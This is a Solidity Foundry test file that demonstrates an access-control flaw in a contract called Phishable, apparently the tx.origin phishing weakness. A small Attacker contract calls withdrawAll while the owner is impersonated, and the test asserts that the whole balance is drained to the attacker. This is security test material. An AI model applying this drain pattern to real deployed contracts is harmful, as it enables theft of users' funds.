
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Phishable} from "../src/Phishable.sol";

contract Attacker {
    function attack(address phishableAddr, address recipient) public {
        Phishable(phishableAddr).withdrawAll(payable(recipient));
    }
}

contract TestAccessControlPhishable is Test {
    Phishable public phishable;
    address public ownerAddr;

    function setUp() public {
        ownerAddr = makeAddr("owner");
        phishable = new Phishable(ownerAddr);
        vm.deal(address(phishable), 1 ether);
    }

    function test_highlightArbitraryUserCanAccess(address caller) public {
        
        // --- 1. Constraints ---
        vm.assume(caller != address(this));
        vm.assume(caller != address(0));
        vm.assume(caller != address(vm)); 
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);
        vm.assume(caller.code.length == 0);
        vm.assume(caller != ownerAddr);
        vm.assume(caller != address(phishable));

        // --- 2. State Configuration ---
        
        vm.etch(caller, type(Attacker).runtimeBytecode);
        
        // --- 3. Execution & Assertion ---
        
        uint256 initialPhishableBalance = address(phishable).balance;
        uint256 initialRecipientBalance = caller.balance;

        vm.prank(ownerAddr);

        (bool success, ) = caller.call(
            abi.encodeWithSelector(
                Attacker.attack.selector,
                address(phishable),
                caller
            )
        );

        assertTrue(success);

        assertEq(address(phishable).balance, 0);
        assertEq(caller.balance, initialRecipientBalance + initialPhishableBalance);
    }
}
